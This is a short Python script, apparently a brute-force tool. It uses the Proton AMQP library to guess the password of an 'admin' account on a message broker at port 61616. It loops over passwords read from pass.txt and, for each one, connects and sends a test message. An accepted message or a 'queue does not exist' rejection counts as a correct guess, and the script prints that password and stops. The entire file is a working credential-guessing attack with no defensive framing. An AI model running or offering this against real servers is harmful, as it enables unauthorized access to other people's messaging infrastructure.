from __future__ import print_function
import sys
import time

from proton import Message
from proton.handlers import MessagingHandler
from proton.reactor import Container

class SendHandler(MessagingHandler):
    def __init__(self, url, address, message_body, password):
        super(SendHandler, self).__init__()
        self.url = url
        self.address = address
        self.message_body = message_body
        self.password = password
        self.sent = False
        self.success = False

    def on_start(self, event):
        conn = event.container.connect(self.url)
        if conn:
            event.container.create_sender(conn, self.address)

    def on_sendable(self, event):
        if not self.sent:
            msg = Message(body=self.message_body)
            event.sender.send(msg)
            print("Message sent!")
            print(f"Password - {self.password}")
            self.sent = True
          

    def on_accepted(self, event):
        print("Message accepted by server - access OK!")
        self.success = True
        event.sender.close()
        event.connection.close()

    def on_disconnected(self, event):
        print("Disconnected")

    def on_rejected(self, event):
        print("Message rejected:", event.delivery.remote.condition)
        if event.delivery.remote.condition and "does not exist" in str(event.delivery.remote.condition.description).lower():
            print("Password correct (auth success), but queue does not exist!")
            self.success = True
        event.sender.close()
        event.connection.close()


try:
    with open('pass.txt', 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
except FileNotFoundError:
    print("File pass.txt not found!")
    sys.exit(1)

login = "admin" 
ip = ""
port = "61616"
address = "testQueue"  
message_body = "test"

success_found = False 

for password in passwords:
    if success_found:
        break

    url = f"amqp://{login}:{password}@{ip}:{port}"
    print(f"Trying password: {password}")
    try:
        handler = SendHandler(url, address, message_body, password)
        Container(handler).run()
        if handler.success:
            print("Success! Stopping brute-force.")
            success_found = True
    except Exception as e:
        print("Failed:", e)
    time.sleep(1) 
